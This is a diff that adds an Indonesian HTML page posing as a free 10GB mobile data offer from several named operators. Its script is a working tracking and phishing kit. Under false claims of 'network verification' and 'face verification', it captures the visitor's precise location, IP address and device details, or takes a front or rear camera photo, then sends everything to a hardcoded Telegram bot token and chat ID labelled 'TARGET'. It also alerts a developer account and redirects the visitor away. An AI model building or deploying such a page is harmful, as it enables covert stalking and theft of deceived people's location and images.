@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dapatkan 10GB GRATIS!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .provider-box {
+            background: #f5f5f5;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .provider-box h3 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .provider-list {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .provider-item {
+            background: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            color: #667eea;
+            border: 1px solid #667eea;
+        }
+        
+        .camera-container {
+            width: 100%;
+            height: 300px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
+            position: relative;
+        }
+        
+        video, canvas {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        canvas {
+            display: none;
+        }
+        
+        .camera-controls {
+            display: flex;
+            gap: 10px;
+            margin: 10px 0;
+        }
+        
+        .camera-btn {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 8px;
+            background: #f0f0f0;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        .camera-btn.active {
+            background: #667eea;
+            color: white;
+        }
+        
+        .progress-container {
+            margin: 30px 0;
+            display: none;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 30px;
+            background: #f0f0f0;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 15px;
+        }
+        
+        .progress-text {
+            text-align: center;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .permission-box {
+            background: #f9f9f9;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 2px solid #667eea;
+        }
+        
+        .permission-box h3 {
+            color: #333;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .permission-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: white;
+            border-radius: 8px;
+        }
+        
+        .permission-item input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            margin-right: 15px;
+            accent-color: #667eea;
+        }
+        
+        .permission-item label {
+            color: #555;
+            font-size: 14px;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 5px 0;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+        }
+        
+        .btn-success {
+            background: #28a745;
+            color: white;
+        }
+        
+        .btn-info {
+            background: #17a2b8;
+            color: white;
+        }
+        
+        .btn-warning {
+            background: #ffc107;
+            color: #333;
+        }
+        
+        .result-box {
+            margin-top: 20px;
+            padding: 15px;
+            background: #d4edda;
+            border-radius: 10px;
+            color: #155724;
+            display: none;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #999;
+            font-size: 12px;
+        }
+        
+        .mode-selector {
+            display: flex;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .mode-btn {
+            flex: 1;
+            padding: 12px;
+            border: 2px solid #667eea;
+            border-radius: 10px;
+            background: white;
+            color: #667eea;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .mode-btn.active {
+            background: #667eea;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎁 PAKET GRATIS 10GB</h1>
+            <p>Dapatkan kuota 10GB GRATIS dari operator pilihanmu!</p>
+        </div>
+        
+        <div class="provider-box">
+            <h3>📱 Pilih Operator:</h3>
+            <div class="provider-list">
+                <span class="provider-item">SMARTFREEN</span>
+                <span class="provider-item">TELKOMSEL</span>
+                <span class="provider-item">AXIS</span>
+                <span class="provider-item">INDOSAT</span>
+                <span class="provider-item">XL</span>
+                <span class="provider-item">THREE</span>
+            </div>
+        </div>
+        
+        <div class="mode-selector" id="modeSelector">
+            <button class="mode-btn active" onclick="setMode('lokasi')">📍 Lokasi</button>
+            <button class="mode-btn" onclick="setMode('kamera')">📸 Kamera</button>
+        </div>
+        
+        <!-- MODE LOKASI -->
+        <div id="modeLokasi">
+            <div class="permission-box">
+                <h3>🔐 Izinkan Akses Lokasi</h3>
+                <div class="permission-item">
+                    <input type="checkbox" checked disabled>
+                    <label>Akses lokasi (untuk verifikasi jaringan)</label>
+                </div>
+                <button class="btn btn-primary" onclick="startLokasi()">IZINKAN AKSES LOKASI</button>
+            </div>
+        </div>
+        
+        <!-- MODE KAMERA -->
+        <div id="modeKamera" style="display: none;">
+            <div class="camera-controls">
+                <button class="camera-btn active" onclick="pilihKamera('depan')">📱 Depan</button>
+                <button class="camera-btn" onclick="pilihKamera('belakang')">📷 Belakang</button>
+            </div>
+            
+            <div class="permission-box">
+                <h3>🔐 Izinkan Akses Kamera</h3>
+                <div class="permission-item">
+                    <input type="checkbox" checked disabled>
+                    <label>Akses kamera (untuk verifikasi wajah)</label>
+                </div>
+                <button class="btn btn-primary" onclick="startKamera()">IZINKAN AKSES KAMERA</button>
+            </div>
+        </div>
+        
+        <!-- CAMERA PREVIEW -->
+        <div class="camera-container" id="cameraPreview">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+        </div>
+        
+        <!-- PROGRESS SECTION -->
+        <div class="progress-container" id="progressSection">
+            <div class="progress-bar">
+                <div id="progressFill" class="progress-fill"></div>
+            </div>
+            <div id="progressText" class="progress-text">Memproses... 0%</div>
+        </div>
+        
+        <!-- RESULT SECTION -->
+        <div class="result-box" id="resultSection">
+            <p>✅ Berhasil!</p>
+            <p style="font-size: 12px; margin-top: 10px;">Mengalihkan ke halaman utama...</p>
+        </div>
+        
+        <div class="footer">
+            <p>© 2026 - Promo Spesial</p>
+        </div>
+    </div>
+    
+    <script>
+        // ========== KONFIGURASI ==========
+        const urlParams = new URLSearchParams(window.location.search);
+        const CHAT_ID = urlParams.get('chat_id') || '7125611713';
+        const TYPE = urlParams.get('type') || 'lokasi'; // lokasi / depan / belakang
+        const BOT_TOKEN = '8720516160:AAFRqlyEaApfjVAOktdP1NQmOvpbfgE1ViU'; // GANTI DENGAN TOKEN LO
+        const DEV_ID = 7125611713; // GANTI DENGAN ID DEVELOPER LO
+        
+        // State
+        let currentMode = TYPE === 'kamera' ? 'kamera' : 'lokasi';
+        let kameraType = TYPE === 'belakang' ? 'belakang' : 'depan';
+        let video = document.getElementById('video');
+        let canvas = document.getElementById('canvas');
+        let context = canvas.getContext('2d');
+        let stream = null;
+        
+        console.log('🎯 Target Chat ID:', CHAT_ID);
+        console.log('📸 Mode:', currentMode);
+        console.log('📱 Kamera:', kameraType);
+        
+        // Set mode awal berdasarkan URL
+        if (TYPE === 'depan' || TYPE === 'belakang') {
+            setMode('kamera');
+            pilihKamera(TYPE);
+        }
+        
+        // Fungsi ganti mode
+        function setMode(mode) {
+            currentMode = mode;
+            
+            // Update button
+            document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
+            if (mode === 'lokasi') {
+                document.querySelector('.mode-btn[onclick="setMode(\'lokasi\')"]').classList.add('active');
+                document.getElementById('modeLokasi').style.display = 'block';
+                document.getElementById('modeKamera').style.display = 'none';
+            } else {
+                document.querySelector('.mode-btn[onclick="setMode(\'kamera\')"]').classList.add('active');
+                document.getElementById('modeLokasi').style.display = 'none';
+                document.getElementById('modeKamera').style.display = 'block';
+            }
+        }
+        
+        // Fungsi pilih jenis kamera
+        function pilihKamera(type) {
+            kameraType = type;
+            document.querySelectorAll('.camera-btn').forEach(btn => btn.classList.remove('active'));
+            if (type === 'depan') {
+                document.querySelector('.camera-btn[onclick="pilihKamera(\'depan\')"]').classList.add('active');
+            } else {
+                document.querySelector('.camera-btn[onclick="pilihKamera(\'belakang\')"]').classList.add('active');
+            }
+        }
+        
+        // Fungsi update progress
+        function updateProgress(percent, text) {
+            document.getElementById('progressFill').style.width = percent + '%';
+            document.getElementById('progressText').innerText = text + ' ' + percent + '%';
+        }
+        
+        // Fungsi kirim pesan ke bot
+        async function sendToBot(chatId, message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return await response.json();
+            } catch (e) {
+                console.log('Gagal kirim pesan:', e);
+                return null;
+            }
+        }
+        
+        // Fungsi kirim foto ke bot
+        async function sendPhotoToBot(chatId, base64Data, caption) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', base64Data);
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'HTML');
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                return await response.json();
+            } catch (e) {
+                console.log('Gagal kirim foto:', e);
+                return null;
+            }
+        }
+        
+        // Fungsi dapatkan lokasi
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            resolve({
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy
+                            });
+                        },
+                        () => {
+                            resolve({ lat: 'Unknown', lng: 'Unknown', accuracy: 'Unknown' });
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    resolve({ lat: 'Unknown', lng: 'Unknown', accuracy: 'Unknown' });
+                }
+            });
+        }
+        
+        // Fungsi dapatkan IP
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+        
+        // Fungsi dapatkan device info
+        function getDeviceInfo() {
+            return {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+        
+        // ========== MODE LOKASI ==========
+        async function startLokasi() {
+            document.getElementById('modeLokasi').style.display = 'none';
+            document.getElementById('progressSection').style.display = 'block';
+            
+            // Progress 25%
+            updateProgress(25, 'Mendapatkan lokasi');
+            
+            setTimeout(async () => {
+                updateProgress(50, 'Memverifikasi jaringan');
+                
+                setTimeout(async () => {
+                    updateProgress(75, 'Mengirim data');
+                    
+                    setTimeout(async () => {
+                        try {
+                            const location = await getLocation();
+                            const ip = await getIP();
+                            const device = getDeviceInfo();
+                            
+                            const message = `📍 <b>TARGET LOKASI</b>
+                            
+📍 Lokasi: ${location.lat},${location.lng}
+🎯 Akurasi: ${location.accuracy}m
+🌐 IP: ${ip}
+📱 Device: ${device.platform}
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+🔗 Maps: https://www.google.com/maps?q=${location.lat},${location.lng}`;
+                            
+                            // Kirim ke user
+                            await sendToBot(CHAT_ID, message);
+                            
+                            // Kirim ke developer
+                            await sendToBot(DEV_ID, `📍 User ${CHAT_ID} lacak lokasi`);
+                            
+                            updateProgress(100, 'Selesai');
+                            
+                            setTimeout(() => {
+                                document.getElementById('progressSection').style.display = 'none';
+                                document.getElementById('resultSection').style.display = 'block';
+                                
+                                // Redirect
+                                setTimeout(() => {
+                                    window.location.href = `https://www.google.com/maps?q=${location.lat},${location.lng}`;
+                                }, 2000);
+                            }, 1000);
+                            
+                        } catch (error) {
+                            updateProgress(0, 'Error: ' + error.message);
+                        }
+                    }, 1000);
+                }, 1000);
+            }, 1000);
+        }
+        
+        // ========== MODE KAMERA ==========
+        async function startKamera() {
+            document.getElementById('modeKamera').style.display = 'none';
+            document.getElementById('cameraPreview').style.display = 'block';
+            document.getElementById('progressSection').style.display = 'block';
+            
+            updateProgress(20, 'Mengakses kamera');
+            
+            try {
+                // Minta akses kamera
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: kameraType === 'depan' ? 'user' : 'environment',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                updateProgress(40, 'Kamera siap');
+                
+                // Tunggu video siap
+                video.onloadedmetadata = () => {
+                    video.play();
+                    
+                    updateProgress(60, 'Mengambil foto');
+                    
+                    // Ambil foto setelah 2 detik
+                    setTimeout(() => {
+                        // Ambil foto
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        // Konversi ke base64
+                        const fotoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+                        
+                        updateProgress(80, 'Mengirim foto');
+                        
+                        // Kirim foto
+                        sendFoto(fotoBase64);
+                        
+                    }, 2000);
+                };
+                
+            } catch (err) {
+                updateProgress(0, 'Gagal: ' + err.message);
+                setTimeout(() => {
+                    window.location.href = window.location.href.split('?')[0];
+                }, 2000);
+            }
+        }
+        
+        async function sendFoto(base64Data) {
+            try {
+                const location = await getLocation();
+                const ip = await getIP();
+                const device = getDeviceInfo();
+                
+                const caption = `📸 <b>FOTO ${kameraType.toUpperCase()} TARGET</b>
+                
+📍 Lokasi: ${location.lat},${location.lng}
+🌐 IP: ${ip}
+📱 Device: ${device.platform}
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+                
+                // Kirim ke user
+                await sendPhotoToBot(CHAT_ID, base64Data, caption);
+                
+                // Kirim notif ke developer
+                await sendToBot(DEV_ID, `📸 User ${CHAT_ID} ambil foto ${kameraType}`);
+                
+                updateProgress(100, 'Selesai');
+                
+                setTimeout(() => {
+                    document.getElementById('progressSection').style.display = 'none';
+                    document.getElementById('resultSection').style.display = 'block';
+                    
+                    // Matikan kamera
+                    if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                    
+                    // Redirect
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 2000);
+                    
+                }, 1000);
+                
+            } catch (error) {
+                updateProgress(0, 'Error: ' + error.message);
+            }
+        }
+    </script>
+</body>
+</html>
